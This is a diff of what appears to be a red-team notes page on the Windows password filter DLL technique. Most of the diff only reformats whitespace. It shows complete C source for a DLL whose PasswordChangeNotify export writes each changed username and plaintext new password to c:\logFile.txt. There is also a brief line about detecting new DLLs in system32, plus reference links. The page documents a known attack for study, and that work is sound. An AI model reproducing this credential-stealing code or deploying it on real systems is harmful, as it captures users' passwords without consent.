@@ -35,52 +35,52 @@ using namespace std;
 
 void writeToLog(const char* szString)
 {
-	FILE *pFile;
-	fopen_s(&pFile, "c:\\logFile.txt", "a+");
+    FILE *pFile;
+    fopen_s(&pFile, "c:\\logFile.txt", "a+");
 
-	if (NULL == pFile)
-	{
-		return;
-	}
-	fprintf(pFile, "%s\r\n", szString);
-	fclose(pFile);
-	return;
+    if (NULL == pFile)
+    {
+        return;
+    }
+    fprintf(pFile, "%s\r\n", szString);
+    fclose(pFile);
+    return;
 
 }
 
 extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void)
 {
-	OutputDebugString(L"InitializeChangeNotify");
-	writeToLog("InitializeChangeNotify()");
-	return TRUE;
+    OutputDebugString(L"InitializeChangeNotify");
+    writeToLog("InitializeChangeNotify()");
+    return TRUE;
 }
 
 extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(
-	PUNICODE_STRING AccountName,
-	PUNICODE_STRING FullName,
-	PUNICODE_STRING Password,
-	BOOLEAN SetOperation)
+    PUNICODE_STRING AccountName,
+    PUNICODE_STRING FullName,
+    PUNICODE_STRING Password,
+    BOOLEAN SetOperation)
 {
-	OutputDebugString(L"PasswordFilter");
-	return TRUE;
+    OutputDebugString(L"PasswordFilter");
+    return TRUE;
 }
 
 extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(
-	PUNICODE_STRING UserName,
-	ULONG RelativeId,
-	PUNICODE_STRING NewPassword)
+    PUNICODE_STRING UserName,
+    ULONG RelativeId,
+    PUNICODE_STRING NewPassword)
 {
-	FILE *pFile;
-	fopen_s(&pFile, "c:\\logFile.txt", "a+");
+    FILE *pFile;
+    fopen_s(&pFile, "c:\\logFile.txt", "a+");
 
-	OutputDebugString(L"PasswordChangeNotify");
-	if (NULL == pFile)
-	{
-		return true;
-	}
-	fprintf(pFile, "%ws:%ws\r\n", UserName->Buffer, NewPassword->Buffer);
-	fclose(pFile);
-	return 0;
+    OutputDebugString(L"PasswordChangeNotify");
+    if (NULL == pFile)
+    {
+        return true;
+    }
+    fprintf(pFile, "%ws:%ws\r\n", UserName->Buffer, NewPassword->Buffer);
+    fclose(pFile);
+    return 0;
 }
 ```
 
@@ -123,7 +123,7 @@ Also, it may be worth considering checking new DLLs dropped to `%systemroot%\sys
 
 ## References
 
-{% embed url="http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html" %}
+{% embed url="http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html" caption="" %}
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1174" %}
+{% embed url="https://attack.mitre.org/wiki/Technique/T1174" caption="" %}
 
